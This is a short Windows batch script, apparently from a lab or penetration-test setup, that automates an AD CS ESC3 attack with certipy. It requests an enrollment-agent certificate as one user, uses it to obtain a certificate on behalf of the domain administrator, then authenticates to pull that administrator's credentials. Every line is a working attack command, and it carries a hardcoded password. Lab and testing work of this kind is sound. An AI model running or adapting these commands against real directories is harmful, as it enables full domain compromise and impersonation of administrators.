@echo off
REM Branch B WT051 ESC3 — certipy ESC3 chain as chief_command
REM Step 1: request enrollment agent cert (CADRE-ESC3-Agent)
REM Step 2: use agent cert to request on-behalf-of another user (CADRE-ESC3-Target)
REM Step 3: UnPAC the on-behalf-of user
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set PYTHONIOENCODING=utf-8

echo y | del esc3-agent.pfx 2>nul
echo y | del esc3-target.pfx 2>nul
echo y | del administrator.ccache 2>nul

echo === STEP 1: request agent cert (chief_command) ===
%PY%\certipy.exe req -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -ca cadre-CA -target dc01.cadre.local -target-ip 192.168.77.10 -dynamic-endpoint -timeout 45 -template CADRE-ESC3-Agent -upn chief_command@cadre.local -sid S-1-5-21-277764030-1371232215-1561074416-1114 -out esc3-agent 2>&1
echo AGENT_REQ_RC %ERRORLEVEL%
dir esc3-agent.pfx 2>&1

echo === STEP 2: on-behalf-of administrator (CADRE-ESC3-Target) ===
%PY%\certipy.exe req -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -ca cadre-CA -target dc01.cadre.local -target-ip 192.168.77.10 -dynamic-endpoint -timeout 45 -template CADRE-ESC3-Target -on-behalf-of cadre\administrator -pfx esc3-agent.pfx -out esc3-target 2>&1
echo ONBEHALF_RC %ERRORLEVEL%
dir esc3-target.pfx 2>&1

echo === STEP 3: UnPAC administrator ===
%PY%\certipy.exe auth -pfx esc3-target.pfx -dc-ip 192.168.77.10 2>&1
echo AUTH_RC %ERRORLEVEL%
